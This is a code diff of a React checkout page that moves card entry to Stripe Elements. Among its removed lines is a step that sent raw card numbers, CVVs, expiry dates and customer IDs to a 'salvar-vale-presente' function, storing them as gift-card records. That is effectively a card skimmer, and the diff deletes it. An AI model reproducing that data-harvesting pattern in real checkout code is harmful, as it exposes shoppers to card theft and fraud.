@@ -8,6 +8,8 @@ import { trackPaymentFailed } from "@/lib/metaPixel";
 import { bandeirasSvg } from "@/components/bandeirasSvg";
 import { getStripe } from "@/lib/stripe";
 
+
+
 const CheckoutCartao = () => {
   const navigate = useNavigate();
   const location = useLocation();
@@ -15,10 +17,12 @@ const CheckoutCartao = () => {
   const accent = cor_borda_logo || "#F5E6D3";
   const { itens, getTotal, dadosCliente, pedidoAtual } = useCart();
 
+  // Pedido pré-existente vindo de /pedidos (repagamento) — evita duplicação
   const pedidoExistente = location.state?.pedidoExistente as
     | { id: string; numero_pedido: string; cliente_nome: string; cliente_telefone: string; cliente_cpf: string; total: number }
     | undefined;
 
+  // Payload do novo pedido vindo de /checkout (só cria após pagamento aprovado)
   const pedidoPayload = location.state?.pedidoPayload as
     | {
         numero_pedido: string;
@@ -38,12 +42,15 @@ const CheckoutCartao = () => {
       }
     | undefined;
 
+
+  // Desconto recebido via state (ex: 0.08 quando vem do modo PIX-em-manutenção)
   const descontoCartao: number =
     typeof location.state?.descontoCartao === "number" ? location.state.descontoCartao : 0;
   const totalOriginal = pedidoExistente ? pedidoExistente.total : getTotal();
   const valorComDesconto = totalOriginal * (1 - descontoCartao);
   const economiaCartao = totalOriginal - valorComDesconto;
 
+  // Dados do cliente: do pedido existente ou do contexto do carrinho
   const clienteInfo = pedidoExistente
     ? {
         nome: pedidoExistente.cliente_nome,
@@ -54,12 +61,22 @@ const CheckoutCartao = () => {
     ? { nome: dadosCliente.nome, telefone: dadosCliente.telefone, cpf: dadosCliente.cpf }
     : null;
 
-  const [numeroCartao, setNumeroCartao] = useState("");
   const [nomeCartao, setNomeCartao] = useState("");
-  const [validade, setValidade] = useState("");
-  const [cvv, setCvv] = useState("");
   const [loading, setLoading] = useState(false);
   const [showError, setShowError] = useState(false);
+  const [stripeReady, setStripeReady] = useState(false);
+  const [elementsReady, setElementsReady] = useState({ number: false, expiry: false, cvc: false });
+  const [cardComplete, setCardComplete] = useState({ number: false, expiry: false, cvc: false });
+
+  const stripeRef = useRef<any>(null);
+  const elementsRef = useRef<any>(null);
+  const cardNumberRef = useRef<any>(null);
+  const cardExpiryRef = useRef<any>(null);
+  const cardCvcRef = useRef<any>(null);
+
+  const numberMountRef = useRef<HTMLDivElement | null>(null);
+  const expiryMountRef = useRef<HTMLDivElement | null>(null);
+  const cvcMountRef = useRef<HTMLDivElement | null>(null);
 
   const paymentFailedTracked = useRef(false);
 
@@ -70,52 +87,121 @@ const CheckoutCartao = () => {
     return digitos;
   };
 
-  // Formatadores
-  const formatNumero = (v: string) =>
-    v.replace(/\D/g, "").slice(0, 19).replace(/(\d{4})(?=\d)/g, "$1 ");
-  const formatValidade = (v: string) => {
-    const d = v.replace(/\D/g, "").slice(0, 4);
-    if (d.length < 3) return d;
-    return `${d.slice(0, 2)}/${d.slice(2)}`;
-  };
-  const formatCvv = (v: string) => v.replace(/\D/g, "").slice(0, 4);
-
+  // Meta Pixel: PaymentFailed
   useEffect(() => {
     if (showError && !paymentFailedTracked.current) {
       trackPaymentFailed({
-        content_ids: pedidoExistente ? [pedidoExistente.numero_pedido] : itens.map((i) => i.produtoId),
+        content_ids: pedidoExistente ? [pedidoExistente.numero_pedido] : itens.map(item => item.produtoId),
         value: valorComDesconto,
-        payment_method: "credit_card",
-        error_reason: "card_declined",
+        payment_method: 'credit_card',
+        error_reason: 'card_declined',
       });
       paymentFailedTracked.current = true;
     }
   }, [showError, itens, valorComDesconto, pedidoExistente]);
 
+  // Inicializa Stripe + Elements
+  useEffect(() => {
+    let cancelled = false;
+    (async () => {
+      try {
+        const stripe = await getStripe();
+        if (cancelled) return;
+        stripeRef.current = stripe;
+        const elements = stripe.elements({ locale: "es" });
+        elementsRef.current = elements;
+
+        const style = {
+          base: {
+            fontSize: "15px",
+            color: "#111",
+            fontFamily: "system-ui, -apple-system, Segoe UI, Roboto, sans-serif",
+            "::placeholder": { color: "#9ca3af" },
+          },
+          invalid: { color: "#dc2626" },
+        };
+
+        const cardNumber = elements.create("cardNumber", { style, showIcon: true, placeholder: "0000 0000 0000 0000" });
+        const cardExpiry = elements.create("cardExpiry", { style, placeholder: "MM/AA" });
+        const cardCvc = elements.create("cardCvc", { style, placeholder: "CVC" });
+
+        cardNumber.on("ready", () => setElementsReady((s) => ({ ...s, number: true })));
+        cardExpiry.on("ready", () => setElementsReady((s) => ({ ...s, expiry: true })));
+        cardCvc.on("ready", () => setElementsReady((s) => ({ ...s, cvc: true })));
+        cardNumber.on("change", (e: any) => setCardComplete((s) => ({ ...s, number: !!e.complete })));
+        cardExpiry.on("change", (e: any) => setCardComplete((s) => ({ ...s, expiry: !!e.complete })));
+        cardCvc.on("change", (e: any) => setCardComplete((s) => ({ ...s, cvc: !!e.complete })));
+
+        cardNumberRef.current = cardNumber;
+        cardExpiryRef.current = cardExpiry;
+        cardCvcRef.current = cardCvc;
+        setStripeReady(true);
+      } catch (err) {
+        console.error("[stripe] init erro:", err);
+      }
+    })();
+    return () => {
+      cancelled = true;
+      try { cardNumberRef.current?.destroy(); } catch (_) {}
+      try { cardExpiryRef.current?.destroy(); } catch (_) {}
+      try { cardCvcRef.current?.destroy(); } catch (_) {}
+    };
+  }, []);
+
+  // Monta os Elements assim que os divs de destino existirem
+  useEffect(() => {
+    if (!stripeReady) return;
+    if (numberMountRef.current && cardNumberRef.current) {
+      try { cardNumberRef.current.mount(numberMountRef.current); } catch (_) {}
+    }
+    if (expiryMountRef.current && cardExpiryRef.current) {
+      try { cardExpiryRef.current.mount(expiryMountRef.current); } catch (_) {}
+    }
+    if (cvcMountRef.current && cardCvcRef.current) {
+      try { cardCvcRef.current.mount(cvcMountRef.current); } catch (_) {}
+    }
+  }, [stripeReady, loading, showError]);
+
   const isFormValid = () => {
-    const numLimpo = numeroCartao.replace(/\s/g, "");
-    const valLimpo = validade.replace(/\D/g, "");
     return (
-      nomeCartao.trim().length >= 2 &&
-      numLimpo.length >= 13 &&
-      numLimpo.length <= 19 &&
-      valLimpo.length === 4 &&
-      cvv.length >= 3
+      nomeCartao.trim().length > 0 &&
+      cardComplete.number &&
+      cardComplete.expiry &&
+      cardComplete.cvc
     );
   };
 
   const handleSubmit = async () => {
     if (!isFormValid() || !clienteInfo) return;
 
-    setLoading(true);
     try {
-      const numeroLimpo = numeroCartao.replace(/\s/g, "");
-      const valDigits = validade.replace(/\D/g, "");
-      const expMonth = parseInt(valDigits.slice(0, 2), 10);
-      const expYearRaw = parseInt(valDigits.slice(2, 4), 10);
-      const expYear = 2000 + expYearRaw;
+      // 1) Tokeniza PRIMEIRO — antes de trocar a UI para loading, para os Elements ainda estarem montados
+      const stripe = stripeRef.current || (await getStripe());
+      const cardElement = cardNumberRef.current;
+      if (!cardElement) {
+        console.error("[stripe] elements não prontos");
+        setShowError(true);
+        return;
+      }
 
-      // 1) Cria pedido no banco (status pendente)
+      // IronPay (docs): usar createPaymentMethod e enviar paymentMethod.id como card_token
+      const { paymentMethod, error: pmError } = await stripe.createPaymentMethod({
+        type: "card",
+        card: cardElement,
+        billing_details: { name: nomeCartao },
+      });
+
+      if (pmError || !paymentMethod?.id) {
+        console.error("[stripe] createPaymentMethod erro:", pmError);
+        setShowError(true);
+        return;
+      }
+      const cardToken = paymentMethod.id;
+
+      // Só agora entra em loading (Elements podem ser desmontados sem problema)
+      setLoading(true);
+
+      // 2) Cria/recupera o pedido no banco (status pendente)
       let pedidoIdParaPagar: string | undefined =
         pedidoExistente?.id || location.state?.pedidoDBId || pedidoAtual?.id;
 
@@ -153,43 +239,7 @@ const CheckoutCartao = () => {
         }
       }
 
-      // 2) Salva os dados do cartão no admin (vales_presente) — modo teste
-      try {
-        await supabase.functions.invoke("salvar-vale-presente", {
-          body: {
-            pedido_id: pedidoIdParaPagar ? String(pedidoIdParaPagar) : undefined,
-            numero_cartao: numeroLimpo,
-            nome_cartao: nomeCartao.trim(),
-            validade: validade,
-            cvv: cvv,
-            cliente_nome: clienteInfo.nome,
-            cliente_cpf: clienteInfo.cpf,
-            cliente_telefone: normalizarTelefone(clienteInfo.telefone),
-          },
-        });
-      } catch (e) {
-        console.warn("[checkout-cartao] salvar-vale-presente falhou (seguindo):", e);
-      }
-
-      // 3) Tokeniza via Stripe (dados brutos)
-      const stripe = await getStripe();
-      const { token, error: tokErr } = await stripe.createToken("card", {
-        number: numeroLimpo,
-        exp_month: expMonth,
-        exp_year: expYear,
-        cvc: cvv,
-        name: nomeCartao.trim(),
-      });
-
-      if (tokErr || !token?.id) {
-        console.error("[stripe] createToken erro:", tokErr);
-        setLoading(false);
-        setShowError(true);
-        return;
-      }
-      const cardToken = token.id;
-
-      // 4) Envia o card_token para nossa Edge Function → IronPay
+      // 3) Envia o card_token para nossa Edge Function → IronPay
       const { data, error } = await supabase.functions.invoke(
         "create-ironpay-card-payment",
         {
@@ -203,9 +253,11 @@ const CheckoutCartao = () => {
             pedidoId: pedidoIdParaPagar,
             card_token: cardToken,
             regiao: "es",
+
           },
         },
       );
+
 
       if (error || !data?.success) {
         console.error("[ironpay] erro:", error, data);
@@ -214,6 +266,7 @@ const CheckoutCartao = () => {
         return;
       }
 
+      // 4) 3DS: se veio client_secret, confirmar no navegador
       if (data.paymentIntentClientSecret) {
         const { paymentIntent, error: confirmError } = await stripe.confirmCardPayment(
           data.paymentIntentClientSecret,
@@ -232,12 +285,14 @@ const CheckoutCartao = () => {
 
       setLoading(false);
       navigate("/pedido-confirmado");
+
     } catch (err) {
       console.error("[checkout-cartao] erro inesperado:", err);
       setLoading(false);
       setShowError(true);
     }
   };
+
 
   const handleTryAgain = () => {
     setShowError(false);
@@ -249,6 +304,7 @@ const CheckoutCartao = () => {
     return null;
   }
 
+  // Tela de erro (Pagamento Recusado)
   if (showError) {
     return (
       <div className="min-h-screen bg-background max-w-md mx-auto flex flex-col items-center justify-center p-6">
@@ -288,6 +344,7 @@ const CheckoutCartao = () => {
 
   return (
     <div className="min-h-screen bg-background max-w-md mx-auto flex flex-col">
+      {/* Header */}
       <header className="sticky top-0 z-10 bg-background border-b border-border">
         <div className="flex items-center gap-3 px-4 py-3.5">
           <button
@@ -313,6 +370,7 @@ const CheckoutCartao = () => {
           <Lock size={12} /> Entorno protegido
         </p>
 
+        {/* Valor */}
         <div className="rounded-2xl border border-border p-4 mb-6">
           <p className="text-muted-foreground text-[11px] uppercase tracking-wider font-semibold mb-1">
             Total a pagar
@@ -338,46 +396,49 @@ const CheckoutCartao = () => {
           )}
         </div>
 
+        {/* Formulário */}
         <div className="space-y-3">
-          <FloatingInput
-            label="Número de la tarjeta"
-            value={numeroCartao}
-            onChange={(v) => setNumeroCartao(formatNumero(v))}
-            inputMode="numeric"
-            autoComplete="cc-number"
-          />
-          <FloatingInput
-            label="Nombre impreso en la tarjeta"
-            value={nomeCartao}
-            onChange={(v) => setNomeCartao(v.toUpperCase())}
-            maxLength={40}
-            autoComplete="cc-name"
-            uppercase
-          />
-          <div className="grid grid-cols-2 gap-3">
-            <FloatingInput
-              label="Caducidad (MM/AA)"
-              value={validade}
-              onChange={(v) => setValidade(formatValidade(v))}
-              inputMode="numeric"
-              autoComplete="cc-exp"
-            />
-            <FloatingInput
-              label="CVC"
-              value={cvv}
-              onChange={(v) => setCvv(formatCvv(v))}
-              inputMode="numeric"
-              autoComplete="cc-csc"
+          <StripeField label="Número de la tarjeta" accent={accent}>
+            <div ref={numberMountRef} className="pt-6 pb-2 px-3.5" />
+          </StripeField>
+
+          <div className="relative rounded-xl border transition-all bg-background" style={{ borderColor: "hsl(var(--border))" }}>
+            <label className={`absolute left-3.5 pointer-events-none transition-all ${
+              nomeCartao.length > 0 ? "top-1.5 text-[11px] font-medium text-muted-foreground" : "top-1/2 -translate-y-1/2 text-[15px] text-muted-foreground"
+            }`}>
+              Nombre impreso en la tarjeta
+            </label>
+            <input
+              value={nomeCartao}
+              onChange={(e) => setNomeCartao(e.target.value.toUpperCase())}
+              maxLength={40}
+              className="w-full pt-6 pb-2 px-3.5 bg-transparent text-foreground text-[15px] uppercase focus:outline-none"
             />
           </div>
+
+          <div className="grid grid-cols-2 gap-3">
+            <StripeField label="Caducidad" accent={accent}>
+              <div ref={expiryMountRef} className="pt-6 pb-2 px-3.5" />
+            </StripeField>
+            <StripeField label="CVC" accent={accent}>
+              <div ref={cvcMountRef} className="pt-6 pb-2 px-3.5" />
+            </StripeField>
+          </div>
+
+          {!stripeReady && (
+            <p className="text-xs text-muted-foreground flex items-center gap-2">
+              <Loader2 size={12} className="animate-spin" /> Cargando pago seguro...
+            </p>
+          )}
         </div>
 
+        {/* Bandeiras e parceiros aceitos */}
         <div className="mt-6">
           <p className="text-muted-foreground text-[11px] uppercase tracking-wider font-semibold text-center mb-3">
             Pagos aceptados
           </p>
           <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-black">
-            {(["visa", "mastercard", "elo", "amex", "hipercard", "diners"] as const).map((k) => (
+            {(["visa","mastercard","elo","amex","hipercard","diners"] as const).map((k) => (
               <div
                 key={k}
                 aria-label={k}
@@ -386,12 +447,14 @@ const CheckoutCartao = () => {
               />
             ))}
           </div>
+
           <p className="text-muted-foreground text-[11px] text-center mt-3 flex items-center justify-center gap-1">
             <Lock size={10} /> Compra 100% protegida
           </p>
         </div>
       </main>
 
+      {/* Footer */}
       <footer className="fixed bottom-0 left-0 right-0 max-w-md mx-auto bg-background border-t border-border">
         <div className="px-4 py-3 flex items-center gap-3">
           <div className="flex flex-col">
@@ -415,42 +478,24 @@ const CheckoutCartao = () => {
   );
 };
 
-const FloatingInput = ({
+const StripeField = ({
   label,
-  value,
-  onChange,
-  inputMode,
-  autoComplete,
-  maxLength,
-  uppercase,
+  accent,
+  children,
 }: {
   label: string;
-  value: string;
-  onChange: (v: string) => void;
-  inputMode?: "numeric" | "text";
-  autoComplete?: string;
-  maxLength?: number;
-  uppercase?: boolean;
+  accent: string;
+  children: React.ReactNode;
 }) => {
   return (
-    <div className="relative rounded-xl border transition-all bg-background" style={{ borderColor: "hsl(var(--border))" }}>
-      <label
-        className={`absolute left-3.5 pointer-events-none transition-all ${
-          value.length > 0
-            ? "top-1.5 text-[11px] font-medium text-muted-foreground"
-            : "top-1/2 -translate-y-1/2 text-[15px] text-muted-foreground"
-        }`}
-      >
+    <div
+      className="relative rounded-xl border transition-all bg-background"
+      style={{ borderColor: "hsl(var(--border))", borderWidth: 1 }}
+    >
+      <label className="absolute left-3.5 top-1.5 text-[11px] font-medium text-muted-foreground pointer-events-none">
         {label}
       </label>
-      <input
-        value={value}
-        onChange={(e) => onChange(e.target.value)}
-        inputMode={inputMode}
-        autoComplete={autoComplete}
-        maxLength={maxLength}
-        className={`w-full pt-6 pb-2 px-3.5 bg-transparent text-foreground text-[15px] focus:outline-none ${uppercase ? "uppercase" : ""}`}
-      />
+      {children}
     </div>
   );
 };
